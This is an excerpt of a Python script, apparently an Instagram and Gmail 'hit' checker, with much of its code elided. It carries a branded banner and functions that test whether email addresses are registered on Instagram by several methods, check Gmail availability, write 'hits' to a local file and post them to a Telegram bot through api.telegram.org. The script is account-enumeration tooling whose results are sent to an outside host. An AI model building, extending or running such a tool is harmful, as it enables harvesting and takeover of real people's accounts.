...
# Example usage
text = "RAINBOW COLORS"
live_text(rainbow_text('                𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐈𝐬 𝐌𝐚𝐝𝐞 𝐁𝐲 𝐄𝐑𝐑𝐎𝐑 • @𝐄_𝐑_𝐑_𝐎_𝐑_98'))
print("\033[96m" + "▄" * 60)
blue = "\033[1m\033[34m"
green = "\033[1m\033[32m"
WDEH = render('META py', colors=['yellow', 'cyan'], align='center')
live_text(WDEH)
print('')                                                               
print("\033[96m" + "▄" * 60)
BOLD=Style.BRIGHT
...
def Balajiiginfo(username,jj):
	...
	try:
		...
		if is_business or followers>100:send_to_Balaji_only=True;header='True'
		else:send_to_Balaji_only=False;header='False';hit_dustu+=1
		hit_data=f"""
		 𓆩𝗬𝗢𝗨 𝗚𝗢𝗧 𝗛𝗜𝗧𓆪 
 つ ◕_◕ ༽つ▬▬▬▬▬▬▬▬▬▬༼ つ ◕_◕ ༽つ
...
"""
		try:
			with open('balajipy.txt','a',encoding='utf-8')as file:file.write(hit_data+'\n\n')
		except:pass
		inline_keyboard=[[{'text':'𝗢𝗪𝗡𝗘𝗥','url':'https://t.me/e_r_r_o_r_98'},{'text':'𝗖𝗛𝗔𝗡𝗡𝗘𝗟','url':'https://t.me/+vzmcUSCAru5iMmU1'}]];data={'text':hit_data,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})};data['chat_id']=ID;requests.get(f"https://api.telegram.org/bot{token}/sendMessage",params=data)
	except:pass
def Balaji(email):
	global orta_mail
	try:
		if'good'==check_gmail(email):username,jj=email.split('@');Balajiiginfo(username,jj)
		else:orta_mail+=1
	except:''
def Balajicheck(email):
	...
	try:
		...
		if method==1:
			...
			if'email_is_taken'in str(response.text):Balaji(email)
			else:kotu_insta+=1
		elif method==2:
			...
			if email in response:Balaji(email)
			else:kotu_insta+=1
		elif method==3:
			...
			if'Another account is using the same email'in response.text:Balaji(email)
			else:kotu_insta+=1
		elif method==4:
